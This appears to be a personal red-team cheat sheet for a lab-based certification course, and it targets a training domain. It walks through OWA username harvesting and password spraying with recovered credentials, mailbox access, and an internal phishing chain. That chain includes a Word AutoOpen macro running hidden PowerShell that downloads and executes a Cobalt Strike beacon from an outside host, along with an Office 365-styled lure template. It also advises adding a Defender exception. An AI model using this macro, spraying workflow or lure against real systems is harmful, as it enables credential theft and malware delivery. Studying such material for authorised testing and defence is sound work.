---
description: 10/01/2025
---

# Cheat Sheet

## Tips

Coming soon.

## Begin Cheat Sheet

Curated from the following [**notes**](https://github.com/An0nUD4Y/CRTO-Notes) (a solid connection on LinkedIn).

I also threw in my own notes as well to give me a "best of both worlds" scenario.

## Listeners

<figure><img src="../../.gitbook/assets/image (363).png" alt=""><figcaption></figcaption></figure>

#### For SMB Pipes

```
S C:\> ls \\.\pipe\
# Grab a random pipe and change the last 4 characters/digits of it aand add it to the Pipename (C2) field
```

### Pivot Listeners



## Password Spraying

{% hint style="info" %}
Tools: `MailSniper.ps1` & `SprayingToolkit`
{% endhint %}

* Excellent for spraying against Office 365 and exchange

### Importing `MailSniper.ps1`

**In PowerShell:**

```
ipmo C:\Tools\MailSniper\MailSniper.ps1
```

### Enumerating NetBIOS Name of Target Domain

**In PowerShell:**

```
Invoke-DomainHarvestOWA -ExchHostname mail.cyberbotic.io
[*] Harvesting domain name from the server at mail.cyberbotic.io
The domain appears to be: CYBER or cyberbotic.io
```

### Obtaining Username Permutations

We will be using [namemash.py](https://gist.github.com/superkojiman/11076951) in order to permutate possible usernames in the domain.

**Use WSL:**

```
ubuntu@DESKTOP-3BSK7NO /m/c/U/A/Desktop> ~/namemash.py names.txt > possible.txt
```

#### Possibilities

```
cat possible.txt

bobfarmer
farmerbob
bob.farmer
farmer.bob
farmerb
bfarmer
fbob
b.farmer
f.bob
bob
farmer
isabelyates
yatesisabel
isabel.yates
yates.isabel
yatesi
iyates
yisabel
i.yates
y.isabel
isabel
yates
johnking
kingjohn
john.king
king.john
kingj
jking
kjohn
j.king
k.john
john
king
joyceadams
adamsjoyce
joyce.adams
adams.joyce
adamsj
jadams
ajoyce
j.adams
a.joyce
joyce
adams
```

### Using Invoke-UsernameHarvestOWA as a Timing Attach to Validate Usernames

**Go back to PowerShell Window:**

```
Invoke-UsernameHarvestOWA -ExchHostname mail.cyberbotic.io -Domain cyberbotic.io -UserList .\Desktop\possible.txt -OutFile .\Desktop\valid.txt
```

**Output:**

<pre><code>[*] Potentially Valid! User:cyberbotic.io\bfarmer
[*] Potentially Valid! User:cyberbotic.io\iyates
[*] Potentially Valid! User:cyberbotic.io\jking
<strong>[*] A total of 3 potentially valid usernames found.
</strong></code></pre>

**Confirming `valid.txt`:**

```
type .\Desktop\valid.txt
cyberbotic.io\bfarmer
cyberbotic.io\iyates
cyberbotic.io\jking
```

Great, we have three possible users to pick from.

### Password Spraying Against the Valid Accounts

**In PowerShell Terminal:**

```
Invoke-PasswordSprayOWA -ExchHostname mail.cyberbotic.io -UserList .\Desktop\valid.txt -Password Summer2022
```

{% hint style="danger" %}
This is likely going to get caught by Defender, so make sure you grant an exception for it in _**Windows Security if needed.**_
{% endhint %}

<figure><img src="../../.gitbook/assets/image (323).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (324).png" alt=""><figcaption></figcaption></figure>

In my case, I had to create an exception for it.

**Upon running it again, here is the output:**

```
PS C:\Users\Attacker> Invoke-PasswordSprayOWA -ExchHostname mail.cyberbotic.io -UserList .\Desktop\valid.txt -Password Summer2022
[*] Now spraying the OWA portal at https://mail.cyberbotic.io/owa/
[*] Current date and time: 11/14/2025 02:09:30
[*] SUCCESS! User:cyberbotic.io\iyates Password:Summer2022
[*] A total of 1 credentials were obtained.
```

### Obtaining the Global Address List w/ Valid Creds

<pre><code><strong>PS C:\Users\Attacker> Get-GlobalAddressList -ExchHostname mail.cyberbotic.io -UserName cyberbotic.io\iyates -Password Summer2022 -OutFile .\Desktop\gal.txt
</strong></code></pre>

**Output:**

```
[*] First trying to log directly into OWA to enumerate the Global Address List using FindPeople...
[*] This method requires PowerShell Version 3.0
[*] Using https://mail.cyberbotic.io/owa/auth.owa
[*] Logging into OWA...
[*] OWA Login appears to be successful.
[*] Retrieving OWA Canary...
[*] Successfully retrieved the X-OWA-CANARY cookie: F1fA4BvyZU2z5k1tSh7u1lCiADgjI94IXnXkFDNn-P6a4eqr9D6rvCa7Zg8mHzhHOnrHXqC4Luk.
[*] Retrieving AddressListId from GetPeopleFilters URL.
[*] Failed to gather the Global Address List Id.

[*] FindPeople method failed. Trying Exchange Web Services...
[*] Trying Exchange version Exchange2010
[*] Using EWS URL https://mail.cyberbotic.io/EWS/Exchange.asmx
[*] Now attempting to gather the Global Address List. This might take a while...

Administrator@cyberbotic.io
bfarmer@cyberbotic.io
bfarmer@cyberbotic.io
bfarmer@cyberbotic.io
nglover@cyberbotic.io
iyates@cyberbotic.io
iyates@cyberbotic.io
jking@cyberbotic.io
jking@cyberbotic.io
jking@cyberbotic.io
nlamb@cyberbotic.io
nglover@cyberbotic.io
nglover@cyberbotic.io
nlamb@cyberbotic.io
nlamb@cyberbotic.io
Administrator@cyberbotic.io
bfarmer@cyberbotic.io
iyates@cyberbotic.io
jking@cyberbotic.io
nglover@cyberbotic.io
nlamb@cyberbotic.io
iyates@cyberbotic.io
[*] Now cleaning up the list...
A total of 6 email addresses were retrieved
```

## Internal Phishing Attacks

The following phishing attacks are going to be using Outlook here.

{% hint style="success" %}
Using our enumerated/valid usernames and successful password spray, we can authenticate against the Outlook server (since we're in the network/domain already) and take a look for anything juicy.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (325).png" alt=""><figcaption></figcaption></figure>

### Authenticating To Outlook

**We obtained the following URL for the Outlook server during the enumeration of our Global Address List:**

```
https://mail.cyberbotic.io/owa/
```

<figure><img src="../../.gitbook/assets/image (328).png" alt=""><figcaption></figcaption></figure>

**Upon continuing and avoiding the non http(s) screen, we can authenticate using our credentials:**

```
iyates@cyberbotic.io
Summer2022
```

### Methodology

The fact that we now have access to this entire mailbox means that we can arbitrarily send emails to anyone in the domain.&#x20;

We can also search for emails that may contain sensitive information.

We can also send backdoored documents or files to a victim.

### Phishing Payload Delivery

1. Send a URL where a payload can be downloaded
2. Attach a malicious payload attachment to the phishing email

### Visual Basic (VBA) Macros

We can leverage VBA to create macros in documents for malicious purposes.

1. Launch Microsoft Word
2. Create a new document
3. **View -> Macros -> View Macros -> Create**
4. Change the "Macros in" field from "All active templates and documents" to "Document1 (document)
5. Give it a name (use name `AutoOpen`) and click **create**

<figure><img src="../../.gitbook/assets/image (330).png" alt=""><figcaption></figcaption></figure>

### Opening Notepad w/ Macro

**Use the following Macro:**

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "notepad"

End Sub
```

However, we want to extend this to actually do something malicious.

### Replacing Notepad w/ Beacon Payload

{% hint style="info" %}
Use the **PowerShell** Beacon payload in Cobalt Strike.
{% endhint %}

1. Open Cobalt Strike
2. Go to **Attacks -> Scripted Web Delivery (S)** and generate a 64-bit PowerShell payload for the HTTP Listener

<figure><img src="../../.gitbook/assets/image (332).png" alt=""><figcaption></figcaption></figure>

3. You will obtain a **Success** prompt from CS.&#x20;

<figure><img src="../../.gitbook/assets/image (334).png" alt=""><figcaption></figcaption></figure>

Be sure to copy/paste that line into VBA and add another set of double quotation marks around the `IEX` command. It should look like this:

```powershell
Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://nickelviper.com/a'))"""
```

<figure><img src="../../.gitbook/assets/image (335).png" alt=""><figcaption></figcaption></figure>

**Putting it all together:**

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://nickelviper.com/a'))"""

End Sub
```

### Phishing Attack: Preparing the Document For Delivery

1. **File -> Info -> Inspect Document -> Inspect Document**&#x20;
2. It will ask you to save, don't worry about that, click cancel and the **Document Inspector** will open
3. Uncheck the **Document Properties and Personal Information**

<figure><img src="../../.gitbook/assets/image (336).png" alt=""><figcaption></figcaption></figure>

4. Next, go to **File -> Save As** and save to `C:\Payloads` (save as type dropdown and change the format from `.docx` to `Word 97-2003 Document (*.doc)`)

<figure><img src="../../.gitbook/assets/image (337).png" alt=""><figcaption></figcaption></figure>

5. **Inside CS, Site Management -> Host File and Configure accordingly:**

<figure><img src="../../.gitbook/assets/image (338).png" alt=""><figcaption></figcaption></figure>

6. Service has been started

<figure><img src="../../.gitbook/assets/image (339).png" alt=""><figcaption></figcaption></figure>

```
http://nickelviper.com:80/ProductReport.doc
```

### Hacky Workarounds for Phishing Email Formatting

Check out [here](https://github.com/ZeroPointSecurity/PhishingTemplates/tree/master/Office365) are some HTML templates based around Office 365 (a copy can also be found in `C:\Tools\PhishingTemplates`).&#x20;

Access `Word.html`, this will launch as an `.html` file in your Default browser (likely Edge in the case of the lab/exam environment).&#x20;

Simply just `ctrl+a` and `ctrl+c` the content.

You can then paste this directly into the OWA text editor.

Use the following `.html` file:

`Word.html`:

```html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=us-ascii">
<meta name="viewport" content="width=device-width, initial-scale=1">
<style type="text/css">
    <!--[if gte mso 9]>
    body
    {
        mso-line-height-rule: exactly;
    }

    table
    {
        border-collapse: collapse;
        mso-table-lspace: 0pt;
        mso-table-rspace: 0pt;
    }

    tr
    {
        mso-line-height-rule: exactly;
    }

    td
    {
        mso-line-height-rule: exactly;
    }

    <!--<![endif]-->
    
    <!--[if gte mso 15]>
    body {
        font-size: 0;
        line-height: 0;
        mso-line-height-rule: exactly;
    }

    table
    {
        border-collapse: collapse;
        mso-table-lspace: 0pt;
        mso-table-rspace: 0pt;
    }

    tr
    {
        font-size: 0px;
        mso-line-height-alt: 0px;
        mso-margin-top-alt: 0px;
        mso-line-height-rule: exactly;
    }

    td
    {
        mso-line-height-rule: exactly;
    }

    <!--<![endif]-->

    .MetaData--hideDesktop
    {
        display: none;
    }

    @media only screen and (max-width: 480px)
    {
        a[x-apple-data-detectors]
        {
            color: inherit !important;
            text-decoration: none !important;
            font-size: inherit !important;
            font-family: inherit !important;
            font-weight: inherit !important;
            line-height: inherit !important;
        }

        /* Gmail-specific so this class gets applied */
        * [lang~="MetaData--hideGmail"]
        {
            display: none !important;
        }

        table
        {
            width: 100% !important;
        }

        table[class="AutoWidth"]
        {
            width: auto !important;
        }

        .MobileNoPadding
        {
            padding: 0 !important;
        }

        .MobileFullWidth
        {
            width: 100% !important;
        }

        img[class="MobileFullWidth"]
        {
            height: auto !important;
        }

        .pl12
        {
            padding-left: 12px !important;
        }

        .MetaData--hideMobile
        {
            display: none;
            font-size: 1px;
            color: #333333;
            line-height: 1px;
            max-height: 0px;
            opacity: 0;
            overflow: hidden;
        }

        .MetaData--hideDesktop
        {
            display: block !important;
        }

        .pbm0
        {
            padding-bottom: 0 !important;
        }
    }

    @media only screen and (max-width: 900px)
    {
        a[x-apple-data-detectors]
        {
            color: inherit !important;
            text-decoration: none !important;
            font-size: inherit !important;
            font-family: inherit !important;
            font-weight: inherit !important;
            line-height: inherit !important;
        }
    }
</style>
</head>
<body style="-webkit-text-size-adjust: 100%; -ms-text-size-adjust: 100%; margin: 0; padding: 0;" dir="ltr">
<!--Share Header-->
<table width="600" border="0" cellspacing="0" cellpadding="0" bgcolor="#ffffff" align="center">
<tbody>
<tr>
<td align="left" valign="top" width="600">
<table border="0" cellpadding="0" cellspacing="0" width="100%">
<tbody>
<tr>
<td align="left" valign="top" style="color: #333333; font-family: 'Segoe UI', 'Segoe UI', Tahoma, Arial, sans-serif; font-size: 15px; font-weight: normal; padding: 20px;">
<span dir="ltr">&lt;This message was sent with high importance.&gt;</span></td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
<!-- ShareSingleFileOneThumbnail Module -->
<table width="600" border="0" cellspacing="0" cellpadding="0" bgcolor="#ffffff" align="center">
<tbody>
<tr>
<td align="left" valign="top" width="600">
<table border="0" cellpadding="0" cellspacing="0" width="100%">
<tbody>
<tr height="38px" style="background-color: #f8f8f8;">
<td colspan="2" style="padding-top: 4px; padding-left: 4px; padding-right: 4px;">
<table style="background-color: #fff5cd;" width="100%">
<tbody>
<tr style="padding-top: 4px;">
<td style="padding-left: 27px;" width="28"><img height="24" width="24" style="border: 0;" data-outlook-trace="F:0|T:1" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAQkSURBVGhD1ZoxaxVBEMdPtBAEsbCysrAVhCAk2FhYWAY/gfkAgiAmLxI0WEVsVBBFRIytnXbRIoXYKQHxXQgGkyAhkqgBE43BZN3f7u3j3mXu9t7l7sUb+MN7b3dn/nO3MzuzSVCJXA2PBYPhyaDR7DPgM7/9l3Jl6lAw/LFfE70XNML3GmsaKgWM6Tl6LmtYu2cy2OzVZMb3DYXrMYLqwLVpdeL2rDrzYE6df7JgwGd+Yyw+N1o7bnR1TRrTp7XRCUdi/3Cozj1eUGOTK+rt/C+1sv5Xrf7eEsEYc5jLGtY6PVan1l2Z3Jg5rF/9Q41tDB69OaOuv1pWMyubItk8YC060GWdQLe2ga1SpRH2BEPNWYwcHJlWIxPLauln+pPuFOhCJ7qNI9ZWT2R9lzLcvKD36h8U996fUx+WNkQSZQDd2MCWsaltRywKSiMc0E9jC4WXXixl7u+ygA1sYTOyPRCx6VDwPiI/NvlNNFYlsNlyouM3ofef2zZ7Qd7BORFxyRkTZIAoYHmVkuJuIradZvNlJ5MqbcB2Y8/7AAcX2IZbpphDqrlNOiuabeZ+bGZCWuMDXGyK5ZzIOuyiE5acLCny4eyj+ehJpePyy6/iWh/gFOmYiNgmxNY25lQsckg9fbdqDBy/9UmduvtZxJFRe+IWeRNwap3YYu1EUaUHOdolBT44B7KeME4UdQDAzTgA1zbRZS2VIcVVWm0DsSz0P/tilLONpHHA23FOZmH0tfwQ4QZHuLaX4qaet1WltJAnFnneFfCmJB4AjmYenFtimxFT5kqLnAMoZqtUCZ8DcDQOwLkltpMytbq0KO6ANF4W8tiBo3VAc26JbvXoltIOrm45MLW44bUDx6izW7Pkabb1Ilo+aQGIxwCBmBZkRYF+gtelWd+DgqvhYy4KzO1BaPpWaTJwDmDAGSnDkSRxl6V8DsCVeYa7DoY+vtB8S5NBfAtJRuOOEIguHSbBFnH6+J7UEbfj9EmAK/MM904diP8mkeA3q3wn7rz5Lq7JsiOh3YEOtpCkOOmIA8RcanSHnEOSeFwX4z4H2rdQB0GcpTjpiORAGnGHvA60BzFSYhrN2kI4I61xyGNnZxpFSjzIIIkTElwQpyGPnZSDLH8pIY2XhTx25FIiZzH3PzggF3OecjqumM9VIsuB9HIayWhonOJuIc2B9IYG8bSUKO0WLj5f3GHf31Iiu2zqq4S/qUdKuFapAvmvVZBaX2whtb9aRGp9ueuk1tfrTmr9Bw4n2nu3nQimKrMTul3AGpuFn3xS2H9RYJPOyMlF7k/TgC502lQZBWzHe94nZACTYuv4Z9a4mMPOntiA4ooKkTKXWj0rThhjDnNZw1qnx+r0HVJliq2davivBkmhrDX9hGmKavTPHllCs21uO7iy0eBzqwEvU4LgH0ZdAmXmg42NAAAAAElFTkSuQmCC">
</td>
<td style="font-family: 'Segoe UI', 'Segoe UI', Tahoma, Arial, sans-serif; font-size: 13px; font-weight: normal;">
<span style="padding-top: 20px; color: #000000" dir="ltr">This link will work for anyone in &lt;Cyberbotic&gt;.</span>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr>
<td width="70" align="center" valign="middle" style="background-color: #f8f8f8; padding-top: 40px; padding-bottom: 20px; padding-left: 27px;">
<a href="#" target="_blank"><img height="70" width="70" style="border: 0;" data-outlook-trace="F:0|T:1" src="data:image/png;base64,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">
</a></td>
<td width="530" style="background-color: #f8f8f8; padding-bottom: 20px; padding-top: 40px; padding-right: 12px; padding-left: 12px;">
<a href="#" target="_blank" style="text-decoration: none;">
<div style="color: #333333; font-family: 'Segoe UI Light', 'Segoe UI Light', 'Segoe UI', Tahoma, Arial, sans-serif; font-size: 21px; font-weight: normal; padding-bottom: 10px;" dir="ltr">
&lt;ProductReport.doc&gt;</div>
</a></td>
</tr>
<tr>
<td width="70" style="background-color: #f8f8f8; padding-bottom: 40px; padding-right: 0px; padding-left: 27px;">
<!-- button template -->
<table style="width:100%" cellpadding="0" cellspacing="0" border="0">
<tbody>
<tr>
<td style="background-color: #2b579a;color: #ffffff;font-family: 'Segoe UI', 'Segoe UI', Tahoma, Arial, sans-serif;font-size: 14px;font-weight: normal;height: 32px">
<p style="text-align:center"><a href="#" target="_blank" style="text-decoration: none;"><span style="background-color: #2b579a;color: #ffffff"><strong style="font-weight:normal">Open</strong></span>
</a></p>
</td>
</tr>
</tbody>
</table>
<!-- end button template --></td>
<td width="530" style="background-color: #f8f8f8;"></td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
<!-- End Module --><!-- Standard Footer -->
<table width="600" border="0" cellspacing="0" cellpadding="0" align="center" bgcolor="#ffffff" style="border-top:2px solid #ffffff;">
<tbody>
<tr>
<td width="600" align="left" valign="top">
<table width="600" border="0" cellspacing="0" cellpadding="0" bgcolor="#ffffff" align="center">
<tbody>
<tr>
<td align="left" valign="top" width="600" style="background-color: #eaeaea;">
<table border="0" cellpadding="0" cellspacing="0" width="100%">
<tbody>
<tr>
<td align="center" valign="top" width="600" style="background-color: #eaeaea;">
<table align="left" border="0" cellpadding="0" cellspacing="0" width="100%" style="background-color: #f8f8f8;">
<tbody>
<tr>
<td align="left" style="background-color: #eaeaea; padding-top: 20px; padding-right: 20px; padding-left: 20px;">
<img alt="Microsoft" border="0" width="200" height="23" style="border: 0;" data-outlook-trace="F:0|T:1" src="data:image/png;base64,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